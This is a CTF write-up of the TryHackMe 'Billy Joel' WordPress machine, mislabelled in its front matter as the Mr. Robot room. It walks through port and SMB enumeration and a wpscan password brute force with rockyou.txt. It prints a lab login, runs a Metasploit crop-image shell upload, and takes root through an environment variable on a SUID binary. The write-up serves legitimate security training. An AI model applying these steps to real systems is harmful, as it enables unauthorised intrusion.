---
layout: post
title: BILLY JOEL - coming soon
date:   2025-10-30 11:05
description: TryHackMe Mr. Robot CTF Write-Up
tags: tryhackme wordpress 
comments: false
---
# BILLY JOEL
-TRYHACKME CTF WRITEUP-
[Link To CTF](https://tryhackme.com/room/mrrobot)



BILLY JOEL




nmap shows: 
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

smbmap shows:
        print$                                                  NO ACCESS       Printer Drivers
        BillySMB                                                READ, WRITE     Billy's local SMB Share
        IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
[*] Closed 1 connections    


****SMB rabbit Hole
We can see 2 images and 1 mp4 audio file
Lets download all 3

Alice-white-rabbit turned out to be a rabbit hole
tswift is literally a taylor swift music video
check-this opens a urlcode to a billy joel music vido 

***Looks like SMB was a dead end

****Going to /wp-content shows another dead end
*** http://10.201.58.182/wp-admin/admin-ajax.php also dead end


As this machine details that a wordpress blog is being used lets check it out
wpscan --update
wpscan -H 
wpscan -e vp,vt,u


Looking at robots.txt 
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

*** http://10.201.58.182/wp-admin/admin-ajax.php also dead end

login page at:
/wp-admin/

Full scan shows usernames 
bjoel
kwheel

we can brute force passwords for these usernames 
wpscan --url http://10.201.58.182 --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 


We get karen Wheelers username and password
Username: kwheel, Password: cutiepie1

We can login at /wp-admin

Attempting to upload payloads shows filters preventing the php script


This is WordPress 5.0, which is vulnerable! 
If we take a look at exploit-db, We find out that there is a vulnerability "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)",



Searching WordPress 5.0 on Metasploit we can run exploit  #0
0   exploit/multi/http/wp_crop_rce   
enter USERNAME PASSWORD RHOST AND LHOST AND LPORT



We get shell as www-data


Looking for the user flag we see its not where we think it is:


Looking for clues we see a termination letter


The company is rubber ducky and billy joel was let go for illegal use of removable media
lets check /media/usb -- denied


let try find / -type f -perm -04000 -ls 2>/dev/null 

We see something interesting

/usr/sbin/checker


it is a root owned binary, with SUID flag on


 it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?


$ export admin=1
$ ltrace checker


so now it tries to run bash! And since this is owned by root, it'll run bash as root! 
/usr/sbin/checker


 We now get root and see the user flag where we tried to look before
We also now get root flag
!!!!!!!!!!!














